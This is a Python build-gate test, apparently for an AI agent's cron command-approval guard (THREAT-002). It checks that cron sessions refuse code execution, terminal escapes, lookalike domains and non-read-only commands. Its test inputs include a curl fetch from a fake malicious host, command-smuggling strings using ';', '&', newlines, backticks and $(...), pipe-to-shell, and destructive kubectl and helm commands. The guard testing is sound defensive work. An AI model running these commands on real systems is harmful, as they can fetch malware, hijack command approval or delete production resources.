"""Build-time behaviour gate for the cron-risk gate patch (THREAT-002).

Run by ``deploy/docker/Dockerfile`` against the patched ``/opt/hermes`` tree,
immediately after ``apply_cron_risk_gate.py``. Proves that:
1. execute_code is unconditionally blocked during cron sessions and permitted otherwise.
2. Terminal escape sequences are refused on cron runs.
3. Lookalike TLD domains are refused on cron runs.
4. 'high' requires every command segment to be an allowlisted read-only inspection command (fail-closed); reads run, mutations/unknown/unanalyzable refused; the run continues. 'low' keeps the denylist floor.
5. Clean commands under 'low' risk continue to execute unimpeded.

A failure here fails the image build.
"""

from __future__ import annotations

import os
import sys

# Freeze environment before importing tools.approval
os.environ.pop("HERMES_YOLO_MODE", None)
os.environ.pop("HERMES_EXEC_ASK", None)

failures: list[str] = []


def check(label: str, actual: object, expected: object) -> None:
    if actual != expected:
        failures.append(f"{label}: expected {expected!r}, got {actual!r}")
        print(f"  FAIL {label}: expected {expected!r}, got {actual!r}")
    else:
        print(f"  ok   {label}")


def main() -> int:
    import tools.approval as ap
    import tools.cron_risk_gate as crg
    from tools.cron_run_scope import cron_run_scope

    for func_name in ("cron_command_policy_block", "cron_content_block", "cron_execute_code_block"):
        if not callable(getattr(crg, func_name, None)):
            failures.append(f"tools.cron_risk_gate.{func_name} is missing")
            print("\nVERIFY FAILED:\n  " + failures[-1])
            return 1

    state = {"cron": True, "mode": "approve"}

    # Pin session predicates
    ap._is_interactive_cli = lambda: False
    ap._is_gateway_approval_context = lambda: False
    ap._is_cron_approval_context = lambda: state["cron"]
    ap._get_cron_approval_mode = lambda: state["mode"]
    ap._get_approval_mode = lambda: "smart"
    ap._command_matches_permanent_allowlist = lambda cmd: False
    ap._match_user_deny_rule = lambda cmd: None
    ap._should_skip_container_guards = lambda *a, **kw: False
    ap.detect_hardline_command = lambda cmd: (False, "")
    ap._check_sudo_stdin_guard = lambda cmd: (False, "")

    # Clean dangerous pattern detection default
    orig_detect_dangerous = getattr(ap, "detect_dangerous_command", lambda cmd: (False, "", ""))
    ap.detect_dangerous_command = lambda cmd: (False, "", "")

    # --- 1. execute_code unconditional refuse on cron runs -------------------
    state["cron"] = True
    exec_res = ap.check_execute_code_guard("import os; os.system('whoami')", "local")
    check("cron execute_code refused", exec_res.get("approved"), False)
    check("refusal mentions THREAT-002", "THREAT-002" in (exec_res.get("message") or ""), True)

    # Interactive or worker session (cron=False) keeps normal execute_code flow
    state["cron"] = False
    exec_res_noncron = ap.check_execute_code_guard("import os; os.system('whoami')", "local")
    check("non-cron execute_code allowed", exec_res_noncron.get("approved"), True)

    state["cron"] = True

    # --- 2. Clean command allowed under low risk -----------------------------
    with cron_run_scope("job-clean", risk="low"):
        clean_res = ap.check_all_command_guards("kubectl get nodes", "local")
        check("clean command allowed", clean_res.get("approved"), True)

        # --- 3. Terminal escape sequence blocked --------------------------------
        esc_res = ap.check_all_command_guards("echo \x1b[31mRed\x1b[0m", "local")
        check("escape sequence refused", esc_res.get("approved"), False)
        check("escape refusal message", "terminal escape" in (esc_res.get("message") or ""), True)

        c1_res = ap.check_all_command_guards("echo \x9b31mRed", "local")
        check("C1 escape sequence refused", c1_res.get("approved"), False)

        # --- 4. Lookalike TLD blocked -------------------------------------------
        lookalike_res = ap.check_all_command_guards(
            "curl https://kubernetes.io.evil-cdn.co/malware", "local"
        )
        check("lookalike TLD refused", lookalike_res.get("approved"), False)
        check("lookalike refusal message", "lookalike domain" in (lookalike_res.get("message") or ""), True)

        delim_res = ap.check_all_command_guards("TARGETS=a.com,kubernetes.io.evil.co", "local")
        check("chained delimiter lookalike refused", delim_res.get("approved"), False)

    # --- 5. Read-only allowlist policy for high risk ------------------------
    ap.detect_dangerous_command = lambda cmd: (True, "rm", "recursive delete") if "rm" in cmd else (False, "", "")

    # low: denylist-only floor — mutating commands still run
    with cron_run_scope("job-low", risk="low"):
        check("low allows mutating apply",
              ap.check_all_command_guards("kubectl apply -f x.yaml", "local").get("approved"), True)

    # high: allowlisted reads pass, everything else refused, run continues
    with cron_run_scope("job-high", risk="high"):
        check("high allows read",
              ap.check_all_command_guards("kubectl get nodes -o wide", "local").get("approved"), True)
        check("high allows read with -n before verb",
              ap.check_all_command_guards("kubectl -n kube-system get pods", "local").get("approved"), True)
        check("high allows stderr to /dev/null",
              ap.check_all_command_guards("kubectl get pods 2>/dev/null", "local").get("approved"), True)
        check("high allows gcloud list with create in filter",
              ap.check_all_command_guards('gcloud compute instances list --filter="status=create"', "local").get("approved"), True)
        check("high allows client dry-run",
              ap.check_all_command_guards("kubectl create -f x.yaml --dry-run=client -o yaml", "local").get("approved"), True)
        check("high allows quoted-pipe read",
              ap.check_all_command_guards("kubectl get pods | tr -s ' '", "local").get("approved"), True)
        check("high allows comparison in filter",
              ap.check_all_command_guards('gcloud compute instances list --filter="creationTimestamp > 2026"', "local").get("approved"), True)
        check("high allows redirect to dev null",
              ap.check_all_command_guards("kubectl get pods &>/dev/null", "local").get("approved"), True)
        check("high allows jsonpath with quoted pipe",
              ap.check_all_command_guards("kubectl get x -o jsonpath='{.items[*]}|{end}'", "local").get("approved"), True)
        check("high allows k alias",
              ap.check_all_command_guards("k get nodes", "local").get("approved"), True)
        check("high refuses mutation",
              ap.check_all_command_guards("kubectl delete ns prod", "local").get("approved"), False)
        check("high refuses unsafe awk",
              ap.check_all_command_guards("awk 'BEGIN{system(\"id\")}'", "local").get("approved"), False)
        check("high refuses mixed punctuation break",
              ap.check_all_command_guards("kubectl get pods ;(helm uninstall prod-release)", "local").get("approved"), False)
        check("high refuses mixed punctuation redirect",
              ap.check_all_command_guards("kubectl get pods ;>/dev/null bash -c id", "local").get("approved"), False)
        check("high refuses dry-run after double-dash",
              ap.check_all_command_guards("kubectl exec -n prod deploy/api -- bash -c id --dry-run=client", "local").get("approved"), False)
        check("high refuses dry-run none",
              ap.check_all_command_guards("kubectl delete ns prod --dry-run=client --dry-run=none", "local").get("approved"), False)
        check("high refuses non-null file redirect",
              ap.check_all_command_guards("echo evil &> /opt/data/jobs.json", "local").get("approved"), False)
        check("high refuses chained mutation",
              ap.check_all_command_guards("kubectl get x && kubectl delete y", "local").get("approved"), False)
        check("high refuses background smuggling",
              ap.check_all_command_guards("kubectl get x & bash -c id", "local").get("approved"), False)
        check("high refuses newline smuggling",
              ap.check_all_command_guards("kubectl get x\nterraform apply", "local").get("approved"), False)
        check("high refuses bq query DML",
              ap.check_all_command_guards("bq query 'DELETE FROM d.t'", "local").get("approved"), False)
        check("high refuses command substitution backtick",
              ap.check_all_command_guards("kubectl get `id`", "local").get("approved"), False)
        check("high refuses pipe to shell",
              ap.check_all_command_guards("kubectl get x -o json | sh", "local").get("approved"), False)
        check("high refuses command substitution",
              ap.check_all_command_guards("kubectl get $(cat /tmp/verb) pods", "local").get("approved"), False)
        check("high refuses unknown executable",
              ap.check_all_command_guards("terraform apply", "local").get("approved"), False)
        check("high refuses file redirect",
              ap.check_all_command_guards("kubectl get pods > /tmp/out", "local").get("approved"), False)
        check("policy msg names SKILL-002",
              "SKILL-002" in (ap.check_all_command_guards("kubectl delete ns prod", "local").get("message") or ""), True)

    # unannotated (fail-closed high): reads allowed, mutation refused
    check("default allows read",
          ap.check_all_command_guards("kubectl get pods -A", "local").get("approved"), True)
    check("default refuses mutation",
          ap.check_all_command_guards("kubectl delete ns prod", "local").get("approved"), False)


    # Reset
    ap.detect_dangerous_command = orig_detect_dangerous

    if failures:
        print(f"\nVERIFY FAILED ({len(failures)} failures):")
        for f in failures:
            print(f"  - {f}")
        return 1

    print("\nAll cron_risk_gate verification checks passed.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
